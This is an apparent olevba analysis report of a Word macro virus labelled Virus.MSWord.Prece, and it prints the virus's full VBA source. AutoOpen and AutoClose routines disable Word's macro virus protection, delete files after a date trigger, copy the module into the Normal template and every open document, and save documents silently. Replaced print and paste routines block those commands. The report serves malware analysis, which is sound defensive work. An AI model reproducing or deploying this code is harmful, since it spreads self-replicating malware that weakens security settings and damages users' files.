olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Prece
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Prece - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Prece - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim What_month_it_is_now, What_day_it_is_now, i, What_is_your_name, MacrosNbr, SourceFile, TemplateName, MacroName, DestFile
Public Const It_is_me = "windows'98"

Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
        Options.VirusProtection = False
            Application.DisplayRecentFiles = False
                What_is_your_name = Application.ActiveDocument.BuiltInDocumentProperties(3)
                        'If What_is_your_name <> "windows'98" Then Exit Sub
                                What_month_it_is_now = Month(Date)
                                        What_day_it_is_now = Day(Date)
                                                If (What_month_it_is_now = 4 And What_day_it_is_now >= 20) Or (What_month_it_is_now > 4 And What_day_it_is_now >= 1) Then
                                                        Kill "c:\Program Files\accessories\*.scp"
                                                            Application.NormalTemplate.VBProject.VBComponents(2).CodeModule.ReplaceLine 15, "                                       rem Say hello to the user "
                                                End If
                                        ActiveDocument.VBProject.VBComponents(2).Export ("d:\precedure_transfer_program.bas")
    If Application.NormalTemplate.VBProject.VBComponents.Count = 1 Then
            Application.NormalTemplate.VBProject.VBComponents.Import ("d:\precedure_transfer_program.bas")
    Else
            For i = 1 To Application.NormalTemplate.VBProject.VBComponents(2).CodeModule.CountOfLines
                    NormalTemplate.VBProject.VBComponents(2).CodeModule.DeleteLines 1
            Next
                    Application.NormalTemplate.VBProject.VBComponents(2).CodeModule.AddFromFile ("d:\precedure_transfer_program.bas")
                            SetAttr ("d:\precedure_transfer_program.bas"), vbHidden
    End If
                                                
                                                
ActiveDocument.VBProject.VBComponents(1).Export ("d:\trial.bas")
    If Application.NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines < 30 Then
            For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
                NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1
            Next
            
            Application.Templates(1).VBProject.VBComponents(1).CodeModule.AddFromFile ("d:\trial.bas")
 
                    For i = 1 To 4
                            Application.NormalTemplate.VBProject.VBComponents(1).CodeModule.ReplaceLine i, "rem"
                    Next
    End If

                                                  
Errhandler:
End Sub

Sub AutoClose()
     On Error Resume Next
        Dim CountProjects
         
Dim mac, HasModule1
   Dim CountFiles
    CountFiles = Application.Documents.Count
        For i = 1 To CountFiles
          With Application.Documents(i).VBProject
               For Each mac In .VBComponents
                    If mac.Name = "Module1" Then
                            HasModule1 = 1
                            HasModule1 = 0
                    Else
                            HasModule1 = 0
                    End If
                Next
                    If HasModule1 = 0 Then
                            DestFile = ActiveDocument.FullName
                                SourceFile = NormalTemplate.FullName
                                        Application.OrganizerCopy Source:=SourceFile, Destination:=DestFile, Name:="Module1", Object:=wdOrganizerObjectProjectItems
                    End If
            End With
        Next
         Options.ConfirmConversions = False
           Options.SaveNormalPrompt = False
                    With ActiveDocument
                            If Not .Saved Then
                                    .Close savechanges:=wdSaveChanges
                            End If
                    End With
Errhandler:
    'Quit only
End Sub

Sub FilePrint()
    What_is_your_name = ActiveDocument.BuiltInDocumentProperties(3)
        If What_is_your_name = It_is_me Then
                    MsgBox ("               Request Denied!") + vbLf + vbLf + "I am afraid you are supposed to be infected!" + vbLf + "Pls contact epals98@telkom.net if I could be of any help!", vbCritical, "Ooop"
        Else
            Application.Dialogs(wdDialogFilePrint).Show
        End If
End Sub



Sub FilePrintDefault()
 What_is_your_name = ActiveDocument.BuiltInDocumentProperties(3)
        If What_is_your_name = It_is_me Then
               
         Else
            Application.ActiveDocument.PrintOut
        End If
End Sub




Sub EditPaste()
    What_is_your_name = ActiveDocument.BuiltInDocumentProperties(3)
        If What_is_your_name = It_is_me Then
            
        Else
            Selection.Paste
        End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

